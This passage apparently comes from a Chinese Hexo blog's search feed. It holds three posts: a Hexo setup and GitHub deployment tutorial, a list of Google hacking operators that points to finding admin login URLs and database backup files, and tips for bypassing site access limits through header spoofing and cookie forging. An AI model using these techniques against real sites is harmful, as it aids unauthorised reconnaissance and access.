<p>$ herxo serve<br>[info] Hexo is running at <a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a>. Press Ctrl+C to stop.[create] d:\Hexo\source_posts\My-New-Post.md<br>[create] d:\Hexo\source_posts\My-New-Post.md</p>
</blockquote>
<p>经验证，在hexo new “My New Post” 时，如果按Ctrl+C将hexo server停掉，就不会出现发2次的问题了。</p>
<p>所以，在hexo new文章时，需要stop server。</p>
<p><strong>4. Generate static files</strong><br>执行下面的命令，将markdown文件生成静态网页</p>
<blockquote>
<p>$ hexo generate</p>
</blockquote>
<p>该命令执行完后，会在 D:\Hexo\public\ 目录下生成一系列html，css等文件。</p>
<p><strong>5. 编辑文章</strong></p>
<p>hexo new “My New Post”会在D:\Hexo\source_posts目录下生成一个markdown文件：My-New-Post.md<br>可以使用一个支持markdown语法的编辑器（比如 Sublime Text 2）来编辑该文件。</p>
<p><strong>6. 部署到Github</strong></p>
<p>部署到Github前需要配置_config.yml文件，首先找到下面的内容</p>
<blockquote>
<p>#Deployment</p>
<p>##Docs: <a href="http://hexo.io/docs/deployment.htmldeploy" target="_blank" rel="external">http://hexo.io/docs/deployment.htmldeploy</a>: type:</p>
</blockquote>
<p>然后将它们修改为</p>
<blockquote>
<p>#Deployment</p>
<p>##Docs: <a href="http://hexo.io/docs/deployment.htmldeploy" target="_blank" rel="external">http://hexo.io/docs/deployment.htmldeploy</a>: type: github<br>  repository: git@github.com:zhchnchn/zhchnchn.github.io.git branch: master</p>
</blockquote>
<p><strong>NOTE1:</strong><br>Repository：必须是SSH形式的url（git@github.com:zhchnchn/zhchnchn.github.io.git），而不能是HTTPS形式的url（<a href="https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误：" target="_blank" rel="external">https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误：</a></p>
<blockquote>
<p>$ hexo deploy<br>[info] Start deploying: github<br>[error] <a href="https://github.com/zhchnchn/zhchnchn.github.io" target="_blank" rel="external">https://github.com/zhchnchn/zhchnchn.github.io</a> is not a valid repositor URL!</p>
</blockquote>
<p>使用SSH url，如果电脑没有开放SSH 端口，会致部署失败。</p>
<blockquote>
<p>fatal: Could not read from remote repository.</p>
<p>Please make sure you have the correct access rights and the repository exists.</p>
</blockquote>
<p><strong>NOTE2：</strong><br>如果你是为一个项目制作网站，那么需要把branch设置为gh-pages。<br><strong>7. 测试</strong><br>当部署完成后，在浏览器中打开<a href="http://zhchnchn.github.io/（https://zhchnchn.github.io/）" target="_blank" rel="external">http://zhchnchn.github.io/（https://zhchnchn.github.io/）</a> ，正常显示网页，表明部署成功。<br><strong>8. 总结：部署步骤</strong><br>每次部署的步骤，可按以下三步来进行。</p>
<blockquote>
<p>hexo clean<br>hexo generate<br>hexo deploy</p>
</blockquote>
<p><strong>9. 总结：本地调试</strong></p>
<ol>
<li>在执行下面的命令后，</li>
</ol>
<blockquote>
<p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试</p>
</blockquote>
<p>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p>
<p><strong>2. 可以用简化的一条命令</strong></p>
<blockquote>
<p>hexo s -g</p>
</blockquote>
<h2 id="命令总结"><a href="#命令总结" class="headerlink" title="命令总结"></a>命令总结</h2><h3 id="3-3-1常用命令"><a href="#3-3-1常用命令" class="headerlink" title="3.3.1常用命令"></a>3.3.1常用命令</h3><blockquote>
<p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub<br>hexo help # 查看帮助<br>hexo version #查看Hexo的版本</p>
</blockquote>
<h3 id="3-3-2"><a href="#3-3-2" class="headerlink" title="3.3.2"></a>3.3.2</h3><blockquote>
<p>hexo deploy -g  #生成加部署<br>hexo server -g  #生成加预览</p>
</blockquote>
<p>命令的简写为：</p>
<blockquote>
<p>hexo n == hexo new<br>hexo g == hexo generate<br>hexo s == hexo server<br>hexo d == hexo deploy</p>
</blockquote>
<h2 id="4-配置Hexo"><a href="#4-配置Hexo" class="headerlink" title="4 配置Hexo"></a>4 配置Hexo</h2><h3 id="4-1-配置文件介绍"><a href="#4-1-配置文件介绍" class="headerlink" title="4.1 配置文件介绍"></a>4.1 配置文件介绍</h3><p>下面的各个部分的介绍，请直接参考【3】。</p>
<p><strong>1._config.yml配置文件介绍</strong><br>NOTE：在修改_config.yml配置文件时，按照【3】的介绍进行修改后，重新 hexo clean 或者hexo deploy时，可能会出现如下错误：</p>
<blockquote>
<p>$ hexo clean<br>[error] { name: ‘HexoError’,<br> reason: ‘can not read a block mapping entry; a multiline key<br> may not be an imp<br> licit key’, mark:<br>    { name: null,<br>       buffer: ‘# Hexo Configuration\n## Docs:<br> <a href="http://hexo.io/docs/configuration.h" target="_blank" rel="external">http://hexo.io/docs/configuration.h</a><br> tml\n## Source: <a href="https://github.com/hexojs/hexo/\n\n#" target="_blank" rel="external">https://github.com/hexojs/hexo/\n\n#</a> Site\ntitle: Zhchnchn\nsubt<br> itle: Coding on the way\ndescription: Zhchnchn\’s blog\nauthor:<br> Zhchnchn\nemail:115063497@qq.com\nlanguage:zh-CN\n\n# URL\n## If your        site is put in a subdirect ……<br> ,<br> position: 249,<br> line: 12,<br> column: 0 },<br> message: ‘Config file load failed’,<br> domain:<br> { domain: null,<br>  _events: { error: [Function] },<br>  _maxListeners: 10,<br>  members: [ [Object] ] },<br>  domainThrown: true,<br>  stack: undefined }</p>
</blockquote>
<p>我的_config.yml配置文件是一个空行，所以错误肯定在前面，经过对比发现，我前面修改了一下 # Site的各项设置，在冒号:后面没留空格导致了该问题，请对比一下下面的区别：</p>
<p>错误的设置：</p>
<blockquote>
<p>author:Zhchnchn<br>email:XXX@qq.com<br>language:zh-CN</p>
</blockquote>
<p>正确的设置：</p>
<blockquote>
<p>author: Zhchnchn<br>email: XXX@qq.com<br>language: zh-CN</p>
</blockquote>
<p>(问题在于必须要有空格)</p>
<h2 id="4-2-安装主题"><a href="#4-2-安装主题" class="headerlink" title="4.2 安装主题"></a>4.2 安装主题</h2><p>Hexo提供了很多主题，具体可参见Hexo Themes【4】。这里我选择使用Pacman主题。具体设置方法如下【5】</p>
<h3 id="4-2-1安装"><a href="#4-2-1安装" class="headerlink" title="4.2.1安装"></a>4.2.1安装</h3><ol>
<li>将Git Shell 切到/D/Hexo目录下，然后执行下面的命令，将pacman下载到 themes/pacman 目录下。</li>
</ol>
<blockquote>
<p>$ git clone <a href="https://github.com/A-limon/pacman.git" target="_blank" rel="external">https://github.com/A-limon/pacman.git</a> themes/pacman</p>
</blockquote>
<ol>
<li><p>修改你的博客根目录/D/Hexo下的config.yml配置文件中的theme属性，将其设置为pacman。</p>
</li>
<li><p>更新pacman主题</p>
</li>
</ol>
<blockquote>
<p>cd themes/pacman<br>git pull</p>
</blockquote>
<p><strong>NOTE：</strong>先备份_config.yml 文件后再升级</p>
<h3 id="4-4-2配置"><a href="#4-4-2配置" class="headerlink" title="4.4.2配置"></a>4.4.2配置</h3><p>如果pacman的默认设置不能满足需要的话，你可以修改 /themes/pacman/下的配置文件_config.yml来定制。</p>
<p>详细主题跟新安装参照【<a href="http://blog.csdn.net/qq_23435721/article/details/50938038" target="_blank" rel="external">http://blog.csdn.net/qq_23435721/article/details/50938038</a>】</p>
<h2 id="5-发布文章"><a href="#5-发布文章" class="headerlink" title="5.发布文章"></a>5.发布文章</h2><blockquote>
<p>$ hexo new “My New Post”<br>[info] File created at d:\Hexo\source_posts\My-New-Post.md<br>hexo g #生成静态文件<br>hexo g -d #部署到Github</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> blog </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Google hacking 语法]]></title>
      <url>/2016/09/03/Google-hacking-%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="1-单词语法"><a href="#1-单词语法" class="headerlink" title="1.单词语法"></a>1.单词语法</h2><a id="more"></a>
<h3 id="intext"><a href="#intext" class="headerlink" title="intext:"></a>intext:</h3><p>这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入：intext：动网，将返回所有在网页正文部分包含”动网”的网页。</p>
<h3 id="allintext"><a href="#allintext" class="headerlink" title="allintext:"></a>allintext:</h3><p>使用方法和intext类似.</p>
<h3 id="intitle"><a href="#intitle" class="headerlink" title="intitle:"></a>intitle:</h3><p>和上面那个intext差不多，搜索网页标题中是否有我们所要找的字符，例如搜索：intitle：安全天使，将返回所有网页标题中包含“安全天使”的网页。同理allintitle也同intitle类似。</p>
<h3 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h3><p>搜索google里关于某些内容的缓存，有时候也许能找到一些好东西哦。</p>
<h3 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h3><p>搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义。</p>
<h3 id="filetype"><a href="#filetype" class="headerlink" title="filetype:"></a>filetype:</h3><p>这个我要重点推荐一下，无论是撒网式攻击还是我们后面要说的搜索指定类型的文件。例如输入：filetype：doc，将返回所有以doc结尾的文件URL。当然如果你找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富。</p>
<h3 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h3><p>查找指定站点的一些基本信息。</p>
<h3 id="inurl"><a href="#inurl" class="headerlink" title="inurl:"></a>inurl:</h3><p>搜索我们指定的字符是否存在于URL中。例如输入：inurl：admin，将返回N个类似于这样的连接：<a href="http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。" target="_blank" rel="external">http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。</a></p>
<h2 id="符号语法"><a href="#符号语法" class="headerlink" title="符号语法"></a><strong>符号语法</strong></h2><h3 id=""><a href="#" class="headerlink" title="+"></a>+</h3><p> 把google可能忽略的字列如查询范围</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="-"></a>-</h3><p>把某个字忽略</p>
<h3 id="-2"><a href="#-2" class="headerlink" title="~"></a>~</h3><p>同意词</p>
<h3 id="-3"><a href="#-3" class="headerlink" title="."></a>.</h3><p>单一的通配符</p>
<h3 id="-4"><a href="#-4" class="headerlink" title="*"></a>*</h3><p>通配符，可代表多个字母</p>
<h3 id="“”"><a href="#“”" class="headerlink" title="“”"></a>“”</h3><p>精确查询</p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[绕过网站访问限制的方法]]></title>
      <url>/2016/09/03/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="1-只允许国外访问"><a href="#1-只允许国外访问" class="headerlink" title="1.只允许国外访问:"></a>1.只允许国外访问:</h2><a id="more"></a>
<p>将 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)。</p>
<h2 id="2-浏览器限制访问"><a href="#2-浏览器限制访问" class="headerlink" title="2.浏览器限制访问:"></a>2.浏览器限制访问:</h2><p>修改 HTTP 请求中的 User-Agent 信息。里面标注的有访问所用的浏览器和系统版本。也可以使用火狐的default user agent插件进行修改。</p>
<h2 id="3-IP地址限制访问："><a href="#3-IP地址限制访问：" class="headerlink" title="3.IP地址限制访问："></a>3.IP地址限制访问：</h2><p>跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关系，也可以使用代理进行访问。</p>
<h2 id="4-用户登陆限制访问："><a href="#4-用户登陆限制访问：" class="headerlink" title="4.用户登陆限制访问："></a>4.用户登陆限制访问：</h2><p>可能是 Cookie 的问题，如果 Cookie 比较简单，可以尝试构造cookie。</p>
<h2 id="5-隐藏信息："><a href="#5-隐藏信息：" class="headerlink" title="5.隐藏信息："></a>5.隐藏信息：</h2><p>查看 robots.txt 可以获得该网站的一些信息。</p>
<h2 id="6-其他："><a href="#6-其他：" class="headerlink" title="6.其他："></a>6.其他：</h2><p>有一些加referer加上代理ip</p>
<p>PS：原文:(<a href="http://byd.dropsec.xyz" target="_blank" rel="external">http://byd.dropsec.xyz</a>)</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
